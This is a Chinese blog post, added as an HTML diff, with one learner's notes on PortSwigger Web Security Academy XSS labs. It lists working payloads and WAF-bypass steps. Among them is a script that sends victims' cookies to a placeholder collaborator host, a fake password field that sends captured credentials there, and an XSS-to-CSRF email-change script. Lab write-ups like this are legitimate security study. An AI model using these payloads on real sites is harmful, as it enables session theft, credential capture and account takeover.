@@ -1,0 +1,1226 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="portswigger, Hyy&#39;s Blog">
+    <meta name="description" content="备忘12Reflected DOM XSS	此处在url传输json和网页的javascript接收过程还有些细节，暂不深究
+
+
+
+portswiggerxss12345678910111213141516location.searchdo">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>portswigger | Hyy&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hyy&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hyy&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            还只是个玩偶的时候，我就很想上战场了。现在机会来了，我唯一的机会。
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">portswigger</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-25
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="备忘"><a href="#备忘" class="headerlink" title="备忘"></a>备忘</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reflected DOM XSS</span><br><span class="line">	此处在url传输json和网页的javascript接收过程还有些细节，暂不深究</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="portswigger"><a href="#portswigger" class="headerlink" title="portswigger"></a>portswigger</h1><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">location.search</span><br><span class="line">document.write 写入文档树</span><br><span class="line">innerHTML</span><br><span class="line">function</span><br><span class="line">location.hash</span><br><span class="line">ng-			---&gt;Angular JS</span><br><span class="line">js replace绕过</span><br><span class="line">存储型xss</span><br><span class="line">	写输入框盗取密码</span><br><span class="line">	csrf改邮箱</span><br><span class="line">绕waf 爆破标签 爆破事件</span><br><span class="line">custom tags自定义标签的payload</span><br><span class="line">svg</span><br><span class="line">link rel=&quot;canonical&quot; accesskey</span><br><span class="line">` 反引号</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in document.write sink using source location.search</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">	document.write可以写到html的文档树里面因此，不能&lt;script&gt;可以用&lt;img&gt;	配合location.search</span><br><span class="line">	<span class="string">&#x27;&gt;&lt;img src onerror=alert(1)&gt;</span></span><br><span class="line"><span class="string">	&quot;&gt;&lt;svg onload=alert(1)&gt;</span></span><br><span class="line"><span class="string">	123123&quot;&gt;&lt;svg onload=alert(1)&gt;</span></span><br><span class="line"><span class="string">	此处先打上123123是为了不让数据库去搜索显示一坨东西</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230407214827465.png" alt="image-20230407214827465"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in innerHTML sink using source location.search</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;svg onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230407220502423.png" alt="image-20230407220502423"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in jQuery anchor href attribute sink using location.search source</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">修改请求头 /feedback?returnPath=/post-----&gt;/feedback?returnPath=javascript:alert(<span class="number">1</span>)</span><br><span class="line">然后点击<span class="built_in">id</span>为backLink的按钮</span><br><span class="line">js attr()可以用来修改或者添加属性或者属性值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230407224316871.png" alt="image-20230407224316871"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in jQuery selector sink using a hashchange event</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">location.<span class="built_in">hash</span> 	url路径使用<span class="built_in">hash</span>算法计算出的唯一标识符</span><br><span class="line">payload页面body写 注意改url</span><br><span class="line">	&lt;iframe src=<span class="string">&quot;https://0a0a0002039bbd5f819320790088009b.web-security-academy.net/#&quot;</span> onload=<span class="string">&quot;this.src+=&#x27;&lt;img src=x onerror=print()&gt;&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">window.location.<span class="built_in">hash</span>	为从第一个井号开始的内容</span><br><span class="line">js arr.<span class="built_in">slice</span>([begin[, end]])</span><br><span class="line">onhashchange 当urlhash值变化触发</span><br><span class="line">井号前为真实地址 井号后为锚点 使页面滚动到锚点处 以下为常见两种锚点写法 .../<span class="comment">#/something</span></span><br><span class="line">	&lt;a name=<span class="string">&quot;something&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">	&lt;element <span class="built_in">id</span>=<span class="string">&quot;something&quot;</span>&gt;&lt;/element&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408004417110.png" alt="image-20230408004417110"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into attribute with angle brackets HTML-encoded</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">angle brackets 尖括号</span><br><span class="line"><span class="number">123123</span><span class="string">&quot; onclick=alert(document.cookie)//	单机搜索框</span></span><br><span class="line"><span class="string">123123&quot;</span> onmouseover=<span class="string">&quot;alert(1)				移动到单选框</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into a JavaScript string with angle brackets HTML encoded</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">我一直觉得要xss下面document.write那句</span><br><span class="line">dfhsk<span class="string">f&#x27;-alert(1)-&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408104133590.png" alt="image-20230408104133590"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in document.write sink using source location.search inside a select element</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stock check检查库存</span><br><span class="line">/product?productId=<span class="number">5</span>&amp;storeId=&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">写入了下拉框里面</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408123737657.png" alt="image-20230408123737657"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">参考</span><br><span class="line">	https://blog.csdn.net/whiteGay/article/details/<span class="number">102498403</span></span><br><span class="line">view-source查看页面源代码存在不对齐的问题</span><br><span class="line">AngularJS指令是扩展的HTML属性，所有指令均带有前缀“ng-”</span><br><span class="line">&lt;body ng-app=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">使body成为AngularJS的根元素</span><br><span class="line"></span><br><span class="line">&#123;&#123;$on.constructor(<span class="string">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected DOM XSS</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">页面有回显但是搜不到，发现调用了js</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408140608499.png" alt="image-20230408140608499"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">js中使用XMLHttpRequest函数去构造新的请求</span><br><span class="line">其中使用了eval函数</span><br><span class="line">于是构造payload</span><br><span class="line">	\&quot;-alert(1)&#125;//</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408140807228.png" alt="image-20230408140807228"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">readyState是XMLHttpRequest对象的一个属性，用来标识当前XMLHttpRequest对象处于什么状态。</span><br><span class="line">readyState总共有5个状态值，分别为0~4，每个值代表了不同的含义</span><br><span class="line">    0：初始化，XMLHttpRequest对象还没有完成初始化</span><br><span class="line">    1：载入，XMLHttpRequest对象开始发送请求</span><br><span class="line">    2：载入完成，XMLHttpRequest对象的请求发送完成</span><br><span class="line">    3：解析，XMLHttpRequest对象开始读取服务器的响应</span><br><span class="line">    4：完成，XMLHttpRequest对象读取服务器响应结束</span><br><span class="line"></span><br><span class="line">回显示包如下图</span><br><span class="line">猜测执行的是</span><br><span class="line">eval(&#x27;var searchResultsObj = &#x27; + this.responseText);</span><br><span class="line">其中this.responseText是指返回的整体 一个json对象</span><br><span class="line"></span><br><span class="line">此处在url传输json和网页的javascript接收过程还有些细节，暂不深究</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408141203081.png" alt="image-20230408141203081"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval里面</span><br><span class="line">	var searchResultsObj = &#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;\\&quot;-alert(1)&#125;//&quot;&#125;</span><br><span class="line">	searchResultsObj的searchTerm回变成NaN 但是会执行alert(1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408152415760.png" alt="image-20230408152415760"></p>
+<p><img src="/2023/07/25/portswigger/image-20230408152710216.png" alt="image-20230408152710216"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Stored DOM XSS</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;&gt;&lt;img src onerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408215956585.png" alt="image-20230408215956585"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Exploiting cross-site scripting to steal cookies</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">fetch(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span><br><span class="line">method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">body:document.cookie</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Exploiting cross-site scripting to capture passwords</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;<span class="built_in">input</span> name=username <span class="built_in">id</span>=username&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=password name=password onchange=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;</span></span><br><span class="line"><span class="string">method:&#x27;POST&#x27;,</span></span><br><span class="line"><span class="string">mode: &#x27;no-cors&#x27;,</span></span><br><span class="line"><span class="string">body:username.value+&#x27;:&#x27;+this.value</span></span><br><span class="line"><span class="string">&#125;);&quot;</span>&gt;</span><br><span class="line">点了框就会自动填上 因为网站同源的关系填的密码很可能是对的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/25/portswigger/image-20230408233513443.png" alt="image-20230408233513443"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Exploiting XSS to perform CSRF</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">var req = new XMLHttpRequest();</span><br><span class="line">req.onload = handleResponse;</span><br><span class="line">req.<span class="built_in">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;/my-account&#x27;</span>,true);</span><br><span class="line">req.send();</span><br><span class="line">function handleResponse() &#123;</span><br><span class="line">    var token = this.responseText.<span class="keyword">match</span>(/name=<span class="string">&quot;csrf&quot;</span> value=<span class="string">&quot;(\w+)&quot;</span>/)[<span class="number">1</span>];</span><br><span class="line">    var changeReq = new XMLHttpRequest();</span><br><span class="line">    changeReq.<span class="built_in">open</span>(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/my-account/change-email&#x27;</span>, true);</span><br><span class="line">    changeReq.send(<span class="string">&#x27;csrf=&#x27;</span>+token+<span class="string">&#x27;&amp;email=test@test.com&#x27;</span>)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">修改密码三个参数</span><br><span class="line">	session 	通过xss被害者自己去操作</span><br><span class="line">    csrf 		从返回包的页面中去获取</span><br><span class="line">    email		被篡改的内容 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">	Reflected XSS into HTML context with most tags and attributes blocked</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</span><br><span class="line">爆破waf		--&gt;标签 --&gt;事件函数 --&gt;闭合</span><br><span class="line">发包的格式要注意</span><br><span class="line">	按照规范添加%<span class="number">20</span>代替空格</span><br><span class="line">    §qwer§ §§里面不能有空格</span><br><span class="line">/?search=&lt;§body§&gt;</span><br><span class="line">/?search=&lt;body%<span class="number">20</span>§qwer§=<span class="number">1</span>&gt;</span><br><span class="line"></span><br><span class="line">利用界面写	此处search后面<span class="string">&quot;转成%22 		转换&quot;</span>是为了搜索内容 单独写</span><br><span class="line">&lt;iframe src=<span class="string">&quot;https://0a0f00870327b4af80bf17e8001800e8.web-security-academy.net/?search=%22&gt;&lt;body+onresize%3Dprint%28%29&gt;&quot;</span> onload=this.style.width=<span class="string">&#x27;100px&#x27;</span>&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;https://0a0f00870327b4af80bf17e8001800e8.web-security-academy.net/?search=%22&gt;&lt;body+onresize=print()&gt;&quot;</span> onload=this.style.width=<span class="string">&#x27;100px&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line">不用iframe以下都能触发 改变窗口的大小可触发</span><br><span class="line">/?search=&lt;body+onresize%3Dprint%<span class="number">28</span>%<span class="number">29</span>&gt;</span><br><span class="line">/?search=&gt;&lt;body+onresize%3Dprint%<span class="number">28</span>%<span class="number">29</span>&gt;</span><br><span class="line">/?search=%<span class="number">22</span>&gt;&lt;body+onresize%3Dprint%<span class="number">28</span>%<span class="number">29</span>&gt;</span><br><span class="line">不加上也行 答案有点怪</span><br><span class="line">&lt;iframe src=<span class="string">&quot;https://0a7700660420720882c0fbc800f000c9.web-security-academy.net/?search=&lt;body+onresize=print()&gt;&quot;</span> onload=this.style.width=<span class="string">&#x27;100px&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
